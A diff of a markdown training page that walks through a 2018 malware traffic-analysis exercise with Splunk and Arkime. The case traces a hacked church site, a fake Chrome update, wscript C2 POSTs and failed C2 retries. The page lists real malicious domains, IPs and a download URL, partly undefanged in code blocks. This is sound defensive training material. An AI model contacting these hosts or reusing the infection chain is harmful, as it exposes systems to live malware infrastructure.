@@ -17,547 +17,697 @@ tags:
 # Sorting through the alerts — fake Chrome update to WScript C2 and follow-on C2 attempts { #sorting-alerts }
 
 !!! abstract "Case summary"
-    malware-traffic-analysis.net **2018-06-30 "Sorting through the alerts"**, worked on the home-lab **pcapbox** VM with **Splunk (Zeek logs) as the main tool** and **Arkime only where Splunk cannot see** (page and POST contents). One Windows 7 PC (**CONSERVATOR-PC, user lloyd.maxwell**) opens a **hacked church website**. Script hidden in seven of the site's `.js` files sends the browser through a **redirector (TDS)** to a **fake "Update Chrome" page**, which downloads **`Chrome_72.3.22.js` from Dropbox**. 46 seconds later the user runs it: `wscript.exe` sends **three XOR-encoded POSTs** (host, user, domain, process list) to a C2 and gets back a **349 KB encrypted payload**, run as `Chrome_72.3.22.exe` from `%TEMP%`. The payload then tries two C2 servers by **bare IP** every ~7.5 minutes — **one refuses, one never answers**. Ends with one simple Snort rule and a short ticket.
+    malware-traffic-analysis.net **2018-06-30 "Sorting through the alerts"**, worked step by step on the home-lab **pcapbox** VM with **Splunk (Zeek logs) as the main tool** and **Arkime only where Splunk cannot see** (page and POST contents). One Windows 7 PC (**CONSERVATOR-PC, user lloyd.maxwell**) opens a **hacked church website**. Script hidden in the site sends the browser through a **fingerprinting redirector (TDS)** to a **fake "Update Chrome" page**, which downloads **`Chrome_72.3.22.js` from Dropbox**. 46 seconds later the user runs it: `wscript.exe` sends **three XOR-encoded POSTs** (host, user, domain, process list) to a C2 and gets back a **349 KB encoded payload**, reported as `Chrome_72.3.22.exe` in `%TEMP%`. Ten seconds later the PC starts trying two **hard-coded C2 IPs** every ~7.5 minutes — **one refuses, one never answers**. Ends with one simple Snort rule and a short ticket.
 
 | | |
 |---|---|
-| **Evidence** | `2018-06-30-traffic-analysis-exercise.pcap` — 2018-06-30 20:27:15 – 20:59:06 UTC (31 min 51 s), 46,937 packets, SHA256 `902c9f31…ddb08e77` |
+| **Evidence** | `2018-06-30-traffic-analysis-exercise.pcap` — 2018-06-30 20:27:15 – 20:59:06 UTC (31.9 min) |
 | **Source** | [malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts"](https://malware-traffic-analysis.net/2018/06/30/index.html) |
-| **Given** | LAN 172.16.2.0/24, DC 172.16.2.9 (FabulousDuke-DC), domain fabulousdukes.com |
-| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, field `pcap_case`), Arkime (tag = case name), Snort 2.9.20, CyberChef |
-| **Deliverables** | Analysis, decoded redirect/download URLs and C2 bodies, one Snort rule, one incident ticket (txt) |
-| **Related pages** | [Night Dew, second pass (pcapbox, Arkime + Splunk)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) · [Beaconing & C2](../../network/beaconing-c2.md) |
+| **Given** | LAN 172.16.2.0/24, DC 172.16.2.9, domain fabulousdukes.com |
+| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, case field `pcap_case`), Arkime (tag = case name), Snort 2.9.20, CyberChef. **No Wireshark.** |
+| **Case name** | `20180630_SORTING_THROUGH_THE_ALERTS` |
+| **Deliverables** | Analysis, decoded download URL and C2 bodies, one Snort rule, one incident ticket (txt) |
+| **Related pages** | [Night Dew, second pass (pcapbox, Snort test guide)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [BEGUILESOFT (Splunk-first baselining)](beguilesoft-hawkeye-ftp-exfil.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) |
 
 !!! tip "How to read this page"
-    Every step has the same order: **Goal → Splunk → Arkime (only when Splunk cannot show it) → Result → Reading the result → Ticket entry**. Every SPL query is explained line by line. **Question** boxes answer the questions that come up on the way.
+    This is the case as it was actually worked: every result block is what the analyst's Splunk or Arkime showed. Each step goes **Goal → Splunk → Arkime (only when Splunk cannot show it) → Result → Reading the result → Ticket entry**. Every SPL query is explained line by line. **Question** boxes are questions asked during the work, with their answers.
 
-    Splunk sees Zeek's **summaries** (who, when, how big, which name). Zeek does not keep **page bodies or POST bodies**, so whenever the answer is *inside* the traffic, the step moves to Arkime for that one look and comes back.
-
-    The result blocks were produced from the same PCAP. Connection counts in your Splunk may differ by one or two because of how Zeek splits retried connections — the findings do not change.
+    Statements are marked where it matters: **[data]** = seen in Splunk or Arkime, **[inference]** = a conclusion drawn from the data and still to be proven.
 
 !!! warning "The indicators on this page are real"
-    Domains, IPs and hashes come from real 2018 malware traffic. Prose and tables are defanged (`hxxp`, `[.]`); code blocks keep the values as typed. **Do not visit them.** Do not run anything you extract.
+    Domains, IPs and hashes come from real 2018 malware traffic. Prose and tables are defanged (`hxxp`, `[.]`); code blocks keep values as typed. **Do not visit them.** Do not run anything you extract.
 
 ## Answers at a glance { #answers }
 
 | Item | Answer | Status |
 |---|---|---|
-| Infected PC | **172.16.2.169, CONSERVATOR-PC**, MAC `00:13:d4:1f:a2:5e`, Windows 7 x64 | Confirmed |
+| Infected PC | **172.16.2.169, CONSERVATOR-PC**, Windows 7 x64 | Confirmed (Kerberos, NTLM, DNS) |
 | User | **lloyd.maxwell** (domain FABULOUSDUKES) | Confirmed |
-| First malicious event | **20:27:53 UTC** — visit to the hacked site `www.stmarybahrain[.]com` (66.226.144.232) | Confirmed |
-| Redirect chain | Injected script → `track.positiverefreshment[.]org/s_code.js` (185.244.149.74) → fake page `lw2e.sineadhollywoodnutt[.]com/topics/index.php` (93.95.100.178) | Confirmed |
-| Download | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` at 20:28:01 (HTTPS — content not visible) | URL confirmed (decoded), download inferred from TLS |
-| Execution | 20:28:47 — `wscript.exe` POSTs to `bb17eb22.login3.kimbrelelectric[.]com/blank.gif` (93.95.100.138) | Confirmed (body decoded) |
-| Data sent | Script path, host name, user, domain, AV name, process list | Confirmed |
-| Payload | 349 KB encrypted reply → `C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe` | Confirmed (path reported by the script itself) |
+| DC | 172.16.2.9, FABULOUSDUKE-DC | Confirmed |
+| First malicious event | **20:27:53 UTC** — visit to the hacked site `www.stmarybahrain[.]com` (66.226.144.232), no Referer | Confirmed |
+| Redirect chain | Site script → `track.positiverefreshment[.]org/s_code.js` (185.244.149.74, browser fingerprint) → fake page `lw2e.sineadhollywoodnutt[.]com/topics/index.php` (93.95.100.178) | Confirmed |
+| Download | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` at 20:28:00–01, ~23 KB received | URL decoded; download proven by SNI and timing; content not visible (HTTPS) |
+| Execution | 20:28:47 — `wscript.exe` POSTs to `bb17eb22.login3.kimbrelelectric[.]com/blank.gif` (93.95.100.138) | Confirmed (body `b=` shows the script path and `wscript.exe`) |
+| Data sent | Script path, host, user, domain, AV name, screen, process list | Confirmed (decoded) |
+| Payload | 349 KB hex reply → reported as `C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe` | Path confirmed; execution inferred from what follows |
 | Follow-on C2 | 46.105.131.66:443 (refused) and 107.170.231.118:4143 (no answer), every ~7.5 min until the end | Confirmed — **no C2 session ever worked** |
-| Malware family | Fake-update chain = **SocGholish (FakeUpdates)** style; follow-on behaviour **consistent with Dridex** | Not confirmed (no hash lookup or signatures) |
-| Exfiltration / lateral movement | Only the reconnaissance POSTs; nothing to other internal hosts | Confirmed |
+| Family | SocGholish-style fake update; follow-on behaviour consistent with Dridex | Not confirmed (no hash or signature) |
 
 ---
 
-## Step 0 — Load the PCAP and check the clock { #prep }
+## Step 0 — Load the PCAP and check the case { #prep }
 
-**Goal:** give the PCAP a **case name** so its logs do not mix with earlier exercises, and make sure every tool shows **UTC**.
+**Goal:** give the PCAP a **case name** so its logs do not mix with other exercises, and make sure all tools show **UTC**.
 
-1. Rename the file to **`20180630_SORTING_ALERTS.pcap`** and drop it into `\\10.50.10.60\incoming`.
-2. On pcapbox, wait for `DONE case=20180630_SORTING_ALERTS` in `tail -f /data/logs/ingest.log`. The `sha256=` on the `START` line is the evidence hash.
-3. Splunk **Preferences → Time zone = UTC**; Arkime **Settings → General → Timezone = UTC**, time range **All**. (Why: see [Night Dew, second pass — 0-2](night-dew-arkime-splunk-netlogon-bruteforce.md#utc).)
-
-Check the case is in Splunk:
+1. Rename the file to **`20180630_SORTING_THROUGH_THE_ALERTS.pcap`** and drop it into `\\10.50.10.60\incoming`.
+2. On pcapbox, wait for `DONE case=20180630_SORTING_THROUGH_THE_ALERTS` in `tail -f /data/logs/ingest.log`.
+3. Splunk **Preferences → Time zone = UTC**; Arkime **Settings → Timezone = UTC**, time range **All**.
 
 ```spl
 index=zeek sourcetype=zeek:conn
 | stats count by pcap_case
 ```
 
-- `index=zeek sourcetype=zeek:conn` — Zeek's connection log (one row per connection).
-- `stats count by pcap_case` — count rows per case name (`pcap_case` = the PCAP file name without `.pcap`).
+- `index=zeek` — the index (Splunk's "drawer") that holds Zeek logs.
+- `sourcetype=zeek:conn` — the connection log, one line per connection.
+- `|` — pass the results on to the next command.
+- `stats count by pcap_case` — count lines per case name.
 
-```text
-pcap_case                  count
-20180511_NIGHT_DEW         216
-20180630_SORTING_ALERTS    623
-```
+!!! note "`ts`, not `_time`"
+    Zeek's own event time is **`ts`** (epoch seconds). Every query on this page sorts and prints with `ts` so it also works on a Splunk where `_time` is the ingest time. `eval t=strftime(ts,"%H:%M:%S")` turns it into a readable time.
 
-!!! note "`ts` or `_time`?"
-    Zeek's own time is the field **`ts`** (seconds since 1970). pcapbox copies it into Splunk's `_time`, but every query here **sorts and prints with `ts`** — that works even on a Splunk where `_time` is the ingest time.
-
-    `eval t=strftime(ts,"%H:%M:%S.%3N")` turns `1530390473.623` into `20:27:53.623` (`%3N` = milliseconds).
+!!! tip "Long case names"
+    `pcap_case=20180630_SORTING*` works in Splunk (`*` = anything) as long as it matches no other case. Arkime's `tags ==` needs the full name.
 
 ---
 
-## Step 1 — The big picture { #overview }
+## Step 1 — Baselining { #baseline }
 
-**Goal:** capture window, how many internal PCs, and how busy each one is.
+Baselining = learning what is **normal** in this capture before looking for anything bad: time range, log types, internal PCs, how busy they are, and who they are.
 
-### Splunk { #overview-splunk }
-
-**Query ① — capture window**
+### 1-1. Which logs exist { #log-types }
 
 ```spl
-index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS
+index=zeek pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
+| stats count by sourcetype
+| sort - count
+```
+
+- No `sourcetype` → all log types of this case. `sort - count` = largest first (`-` descending).
+
+```text
+sourcetype          count
+zeek:conn           729
+zeek:dns            313
+zeek:ssl            265
+zeek:files          176
+zeek:x509           171
+zeek:http           134
+zeek:ocsp           72
+zeek:kerberos       37
+zeek:ldap_search    21
+zeek:dce_rpc        18
+zeek:ldap           13
+zeek:weird          7
+zeek:smb_mapping    6
+zeek:software       5
+zeek:ntp            4
+zeek:smb_files      2
+zeek:ntlm           1
+```
+
+**[data] Reading:**
+
+- **`zeek:dhcp` is missing.** The PC already had its IP lease when the capture started, so the host name must come from somewhere else (1-5).
+- **Web logs dominate** (`ssl` 265, `http` 134): someone was browsing. HTTPS is twice HTTP, but the **134 HTTP requests can be read in full** — they will be the main material.
+- **Domain logs** (`kerberos`, `ldap`, `dce_rpc`, `smb_*`, `ntlm`) = an AD PC talking to its DC: logons, group policy. User and computer names live here.
+- `ocsp` (certificate checks), `ntp` (time), `weird` (odd packets) are normally harmless. `software` lists programs Zeek recognised — useful in 1-5.
+
+### 1-2. Capture window { #window }
+
+```spl
+index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
 | stats min(ts) as first max(ts) as last count as sessions
+| eval duration_min=round((last-first)/60,1)
 | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
 ```
 
-- Line 1: this case only.
-- Line 2: one summary row — earliest and latest `ts`, number of connections.
-- Line 3: epoch seconds → readable date.
+- Line 2: one summary row — earliest, latest, number of connections. `as` names the result.
+- Line 3: `eval` computes a new field; minutes, one decimal.
+- Line 4: epoch → readable date. **Line 3 must come before line 4** — after line 4 `first` and `last` are text and cannot be subtracted.
 
 ```text
-first                 last                  sessions
-2018-06-30 20:27:15   2018-06-30 20:59:05   623
+first                 last                  sessions  duration_min
+2018-06-30 20:27:15   2018-06-30 20:59:06   729       31.9
 ```
 
-**Query ② — who starts connections**
+### 1-3. Which internal IPs start connections { #internal-hosts }
 
 ```spl
-index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS
-| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received by id_orig_h
+index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
+| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h
+| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
 | sort - sessions
 ```
 
-- `id_orig_h` = the IP that **started** the connection.
-- `dc(id_resp_h)` = **distinct count** of destinations.
-- `orig_bytes` / `resp_bytes` = payload bytes sent by the starter / by the other side.
-- `sort - sessions` = biggest first.
+- `id_orig_h` = the IP that **started** the connection (`orig` = originator, `resp` = responder, `_h` = host, `_p` = port).
+- `dc()` = distinct count. `orig_bytes` / `resp_bytes` = payload bytes sent by each side.
 
 ```text
-id_orig_h      sessions  destinations  sent      received
-172.16.2.169   622       185           846554    34117200
-172.16.2.9     1         1             62        0
+id_orig_h      sessions  destinations  sent     received   first     last
+172.16.2.169   729       184           845926   34269192   20:27:15  20:59:06
 ```
 
-### Arkime (quick cross-check) { #overview-arkime }
+**[data] Reading:**
+
+- **One PC.** The DC does not appear: Zeek files its NetBIOS reply under the connection the PC started (for UDP too, the side that sends first is `orig`).
+- **184 destinations in 32 minutes** — a beacon needs 1–3. This is a **person browsing** (one news page pulls dozens of ad and CDN servers), so "top talker" will not find the malware. The plan is to **remove the normal and see what is left**.
+- Received ≫ sent (34 MB vs 0.85 MB) — normal for a PC. The reverse would suggest exfiltration.
+
+### 1-4. Arkime cross-check { #arkime-baseline }
 
 ```text
-tags == 20180630_SORTING_ALERTS
+tags == 20180630_SORTING_THROUGH_THE_ALERTS
 ```
 
-SPIView → **General** shows the same picture: Src IP almost all `172.16.2.169`; Dst IP led by the DC `172.16.2.9`, then many CDN/ad addresses.
+**654 sessions** (Zeek 729 — the tools split UDP and retried connections differently; the picture is the same). **SPIView → General → Src IP / Dst IP** shows one PC and a long list of destinations.
 
-### Reading the result { #overview-reading }
+**How to read Databytes / Bytes:** the top number is **data** (payload), the bottom is total bytes with headers. **Databytes 0** = only connection signals, no data.
 
-- **One PC.** 172.16.2.169 starts everything; 172.16.2.9 (the DC, as given) makes one NetBIOS reply. The alerts were about this PC.
-- **185 destinations in 31 minutes** — far more than a beacon would need. That is a **person browsing** (news sites load dozens of ad and CDN hosts). The malicious traffic will be a few rows hidden among them, so counting "top talkers" will not find it. Read **HTTP** instead (Step 3).
-- **34 MB received** — mostly web pages and (as Step 3 shows) a Chrome component update.
+**[data] Lines that look different — noted, not concluded:**
 
-**Ticket entry:** none. Baselining is not a finding.
+| Destination | Shape |
+|---|---|
+| `46.105.131.66:443` | Several sessions per source port, 2 packets each, **Databytes 0**, repeating every few minutes |
+| `107.170.231.118:4143` | 3 packets, **Databytes 0**, unusual port, repeating every few minutes |
 
----
+Everything else is ordinary DC traffic (53 DNS, 88 Kerberos, 123 NTP, 389 LDAP, 445 SMB, 137/138 NetBIOS, 5355 LLMNR `wpad`, 1900 SSDP) and `crl.microsoft.com`.
 
-## Step 2 — Who is 172.16.2.169? { #identity }
+### 1-5. Who is 172.16.2.169 { #identity }
 
-**Goal:** host name, MAC and user for the ticket.
+No DHCP, so use the other places Windows says its name.
 
-### 2-1. DHCP — empty this time { #dhcp }
-
-```spl
-index=zeek sourcetype=zeek:dhcp pcap_case=20180630_SORTING_ALERTS
-| table ts client_addr mac host_name
-```
-
-**Result: no rows.**
-
-!!! question "Question: DHCP gave nothing — what now?"
-    The PC already had a valid lease when the capture started, so it never asked. Use the other places Windows says its name:
-
-    - **Kerberos** — the computer account (`NAME$`) and the user at logon.
-    - **DNS** — Windows registers its own name with the DC (a `SOA` query for `<name>.<domain>` = dynamic DNS update).
-    - **NetBIOS browser announcements** (UDP 138 to the broadcast) — Zeek does not log these, Arkime shows them.
-    - **MAC** — Zeek's `conn.log` has `orig_l2_addr` only if that option is on; Arkime always shows the MAC in the session.
-
-### 2-2. Kerberos { #kerberos }
+**① Kerberos**
 
 ```spl
-index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_ALERTS
+index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
 | eval t=strftime(ts,"%H:%M:%S")
-| sort ts
-| table t id_orig_h request_type client service success error_msg
+| stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client
+| sort first
 ```
 
-- `request_type`: **AS** = logon (ask for a TGT), **TGS** = ticket for a service.
-- `client` = `account/REALM`. A name ending in **`$`** is a **computer**; without `$` it is a **person**.
-- `service` = what the ticket is for (`krbtgt/...` = the logon ticket itself, `cifs/` = file sharing, `ldap/` = directory).
-- `error_msg` = why a request failed.
+- `client` = `account/REALM`. `values()` = every distinct value. `request_type`: **AS** = logon ticket (TGT), **TGS** = service ticket, **AP** = presenting a ticket to a service.
 
 ```text
-t         id_orig_h     request_type  client                              service                                   success  error_msg
-20:27:17  172.16.2.169  AS            conservator-pc$/FABULOUSDUKES.COM   krbtgt/FABULOUSDUKES.COM                  false    KDC_ERR_PREAUTH_REQUIRED
-20:27:17  172.16.2.169  AS            conservator-pc$/FABULOUSDUKES.COM   krbtgt/FABULOUSDUKES.COM                  true     -
-20:27:17  172.16.2.169  TGS           CONSERVATOR-PC$/FABULOUSDUKES.COM   ldap/FabulousDuke-DC.fabulousdukes.com/…  true     -
-...
-20:27:18  172.16.2.169  AS            lloyd.maxwell/FABULOUSDUKES         krbtgt/FABULOUSDUKES                      false    KDC_ERR_PREAUTH_REQUIRED
-20:27:18  172.16.2.169  AS            lloyd.maxwell/FABULOUSDUKES         krbtgt/FABULOUSDUKES                      true     -
-20:27:18  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     host/conservator-pc.fabulousdukes.com     true     -
-20:27:35  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     LDAP/FabulousDuke-DC.fabulousdukes.com/…  true     -
-20:27:36  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     cifs/fabulousduke-dc.fabulousdukes.com    true     -
-...
+client                              first     count  types    success      errors
+/FABULOUSDUKES.COM                  20:27:17  13     AP       true
+CONSERVATOR-PC$/FABULOUSDUKES.COM   20:27:17  11     AS TGS   false true   KDC_ERR_PREAUTH_REQUIRED
+conservator-pc$/FABULOUSDUKES.COM   20:27:17  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
+lloyd.maxwell/FABULOUSDUKES         20:27:18  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
+lloyd.maxwell/FABULOUSDUKES.COM     20:27:18  5      TGS      true
+conservator-pc$/fabulousdukes.com   20:27:44  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
 ```
 
-- The first AS of each account fails with **`KDC_ERR_PREAUTH_REQUIRED`** and the next one works — normal **pre-authentication**, not a wrong password.
-- Upper/lower case of the names can differ between rows (`conservator-pc$` / `CONSERVATOR-PC$`) — Windows is not consistent; it is the same account.
-- The PC logs on at 20:27:17 and **lloyd.maxwell** at 20:27:18 — the capture starts right at logon.
+| Seen | Meaning |
+|---|---|
+| Name ends in `$` | **Computer account** → host name **CONSERVATOR-PC** |
+| No `$` | **User** → **lloyd.maxwell**, logged on at 20:27:18 |
+| Empty account (`/FABULOUSDUKES.COM`, AP) | The name is inside the encrypted part of an AP request; Zeek cannot show it. Normal |
+| Same account in different case/realm | Windows is not consistent; same account |
+| `KDC_ERR_PREAUTH_REQUIRED` then success | Normal pre-authentication. A wrong password would be `KDC_ERR_PREAUTH_FAILED` — none here |
 
-### 2-3. DNS dynamic update { #dns-name }
+**② NTLM**
 
 ```spl
-index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS qtype_name=SOA
+index=zeek sourcetype=zeek:ntlm pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
+| eval t=strftime(ts,"%H:%M:%S")
+| table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success
+```
+
+```text
+t         id_orig_h     id_resp_h   id_resp_p  username          hostname         domainname     server_nb_computer_name  success
+20:27:35  172.16.2.169  172.16.2.9  445        CONSERVATOR-PC$   CONSERVATOR-PC   FABULOUSDUKES  FABULOUSDUKE-DC          true
+```
+
+The computer account logging on to the DC's SMB share at start-up (group policy). It also names the DC: **FABULOUSDUKE-DC**.
+
+**③ DNS dynamic update**
+
+```spl
+index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS qtype_name=SOA
 | eval t=strftime(ts,"%H:%M:%S")
 | table t id_orig_h id_resp_h query qtype_name rcode_name
 ```
 
-- `qtype_name=SOA` — only "who owns this zone?" queries, which Windows sends before updating its own DNS record.
-
 ```text
-t         id_orig_h      id_resp_h    query                               qtype_name  rcode_name
-20:27:16  172.16.2.169   172.16.2.9   Conservator-PC.fabulousdukes.com    SOA         NOERROR
-20:27:16  172.16.2.169   172.16.2.9   fabulousdukes.com                   SOA         NOERROR
-20:37:03  172.16.2.169   172.16.2.9   Conservator-PC.fabulousdukes.com    SOA         NOERROR
-20:37:03  172.16.2.169   172.16.2.9   fabulousdukes.com                   SOA         NOERROR
+t         id_orig_h     id_resp_h   query                              qtype_name  rcode_name
+20:37:03  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
+20:27:16  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
 ```
 
-### 2-4. Arkime: MAC and NetBIOS name { #arkime-mac }
+A domain PC registers its own name with the DC; the `SOA` query comes first. Exactly 10 minutes apart — Windows re-registering. Three sources agree: **CONSERVATOR-PC / fabulousdukes.com**.
 
-```text
-tags == 20180630_SORTING_ALERTS && ip.src == 172.16.2.169 && port.dst == 138
+**④ Software**
+
+```spl
+index=zeek sourcetype=zeek:software pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
+| eval t=strftime(ts,"%H:%M:%S")
+| table t host software_type name unparsed_version
 ```
 
-Expand a session: **Src MAC `00:13:d4:1f:a2:5e`**, and the payload shows `\MAILSLOT\BROWSE ... CONSERVATOR-PC` (the PC announcing itself to the network).
+```text
+t         host          software_type   name                  unparsed_version
+20:43:13  172.16.2.169  OS::WINDOWS     Windows
+20:33:54  172.16.2.169  HTTP::BROWSER   Microsoft BITS        Microsoft BITS/7.5
+20:28:47  172.16.2.169  HTTP::BROWSER   MSIE                  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
+20:28:00  172.16.2.169  HTTP::BROWSER   Microsoft-CryptoAPI   Microsoft-CryptoAPI/6.1
+20:27:53  172.16.2.169  HTTP::BROWSER   Chrome                Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
+```
 
-**Reading:** IP 172.16.2.169, host **CONSERVATOR-PC** (Kerberos, DNS and NetBIOS agree), MAC `00:13:d4:1f:a2:5e`, user **lloyd.maxwell**, domain FABULOUSDUKES / fabulousdukes.com, DC 172.16.2.9.
+- Zeek writes each program it recognises once. `Windows NT 6.1` = Windows 7, `Win64; x64` = 64-bit.
+- The user's browser is **Chrome 67** (20:27:53). BITS (Windows downloads) and CryptoAPI (certificate checks) are Windows itself.
+- **[data] 54 s later something calls itself "MSIE 7.0"** — a 2006 browser. With `Trident/7.0` (IE11's engine) on Windows 7 this is the default User-Agent of **Windows' HTTP objects used by scripts** (wscript, Office macros). Noted as a candidate.
 
-**Ticket entry (host details only):**
+**Baseline notes — three candidates, no conclusions yet:**
+
+1. `46.105.131.66:443` — no data, repeating
+2. `107.170.231.118:4143` — no data, unusual port, repeating
+3. 20:28:47 `MSIE 7.0` — a program that is not the user's browser
+
+**Ticket entry (host line only; baselining itself is not logged):**
 
 ```text
-172.16.2.169 CONSERVATOR-PC (MAC 00:13:d4:1f:a2:5e) – user FABULOUSDUKES\lloyd.maxwell
+172.16.2.169 CONSERVATOR-PC – user FABULOUSDUKES\lloyd.maxwell
 ```
 
 ---
 
-## Step 3 — HTTP first: from a church website to a fake Chrome update { #http }
+## Step 2 — External destinations: remove the normal, see what is left { #destinations }
 
-### 3-1. HTTP by host { #http-hosts }
-
-**Goal:** 134 HTTP requests is too many to read one by one at first. Group them by **Host** and look at the shape.
+### 2-1. By port { #ports }
 
 ```spl
-index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS
+index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
+| stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p
+| sort - count
+```
+
+- `NOT id_resp_h=172.16.0.0/12` — Splunk understands CIDR ranges on IP fields; drops internal addresses. `224.0.0.0/4` drops multicast.
+- `service` = the protocol Zeek recognised from the content; empty = Zeek could not tell.
+- `conn_state`: **SF** normal start and end · **S0** SYN, no answer · **REJ** SYN answered by RST (refused) · **RSTO/RSTR** reset by PC/server · **SH/OTH** partial, common at capture edges.
+
+```text
+proto  id_resp_p  count  ips  service  states                          sent    received
+tcp    443        364    163  ssl      OTH REJ RSTO RSTR S1 SF         642014  5667734
+tcp    80         27     14   http     RSTO SF                         58106   28337141
+tcp    4143       16     1             S0                              0       0
+udp    443        10     6             SF                              45454   174932
+```
+
+**[data] Reading:**
+
+- tcp/443: HTTPS browsing — but a **REJ** is mixed in (2-3 shows who).
+- tcp/80: **28 MB** received — 3-1 shows it is BITS from Google.
+- **tcp/4143: one IP, no service, only S0, zero bytes.** Unusual port, never answered.
+- udp/443 with no service is **QUIC** (Google's HTTPS over UDP, used by Chrome). Zeek's QUIC analyser is off, hence empty. Normal.
+
+### 2-2. By domain { #domains }
+
+```spl
+index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT query="*fabulousdukes.com"
+| rex field=query "(?<domain>[^.]+\.[^.]+)$"
 | eval t=strftime(ts,"%H:%M:%S")
-| stats count min(t) as first values(method) as methods values(user_agent) as user_agents by host
+| stats min(t) as first count dc(query) as names values(query) as examples by domain
+| eval examples=mvindex(examples,0,2)
 | sort first
 ```
 
-- `host` — the HTTP Host header (pcapbox puts it into Splunk's `host` field).
-- `values(method)` / `values(user_agent)` — every distinct value per host.
-- `sort first` — in the order the hosts were first used.
+- `rex` cuts part of a value into a new field with a regular expression. `(?<domain> … )` names the part; `[^.]+` = characters that are not a dot; `\.` = a real dot; `$` = end. Result: the last two labels (`r4---sn-p5qs7nek.gvt1.com` → `gvt1.com`).
+- `mvindex(list,0,2)` keeps the first three values (counted from 0).
 
-```text
-host                                   count  first     methods     user_agents
-www.stmarybahrain.com                  52     20:27:53  GET         Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
-track.positiverefreshment.org          3      20:27:55  GET         Mozilla/5.0 ... Chrome/67.0.3396.99 ...
-lw2e.sineadhollywoodnutt.com           9      20:27:57  GET         Mozilla/5.0 ... Chrome/67.0.3396.99 ...
-ocsp.digicert.com                      1      20:28:00  GET         Microsoft-CryptoAPI/6.1
-bb17eb22.login3.kimbrelelectric.com    3      20:28:47  POST        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; ...)
-redirector.gvt1.com                    32     20:33:54  HEAD GET    Microsoft BITS/7.5
-r4---sn-p5qs7nek.gvt1.com              15     20:33:54  HEAD GET    Microsoft BITS/7.5
-r4---sn-p5qs7nee.gvt1.com ... (6 more gvt1.com hosts)  20:34–20:35  GET    Microsoft BITS/7.5
-crl.microsoft.com                      2      20:43:13  GET         Microsoft-CryptoAPI/6.1
+116 domains came back. **How to remove the normal:**
+
+1. Known companies: microsoft, google, googleapis, bing, facebook, twitter, yahoo, cloudfront, windows.net.
+2. **The CNN burst:** `cnn.com` at 20:27:52, then dozens of ad and tracking domains 20:27:53–20:28:03 (optimizely, doubleclick, outbrain, rubiconproject, pubmatic, criteo …). Names with *ad, pixel, sync, match, track, cdn, beacon* are mostly ad tech.
+3. Windows itself: `gvt1.com` (BITS), `digicert.com`, `_tcp.local` (Chromecast discovery).
+
+**[data] What is left, in time order:**
+
+| First | Domain | Note |
+|---|---|---|
+| 20:27:52 | **stmarybahrain.com** (`www.`) | A church site, same second as CNN |
+| 20:27:54 | **positiverefreshment.org** (`track.`) | "track" on a non-ad domain |
+| 20:27:56 | **sineadhollywoodnutt.com** (`lw2e.`) | Person-like name, random-looking sub-domain |
+| 20:27:59 | dropbox.com | Legitimate, but a **file download** service |
+| 20:28:00 | dropboxusercontent.com (`uc7cfbc6f….dl.`) | Dropbox's file server |
+| 20:28:24 | summerhamster.com | Odd name — see the question box |
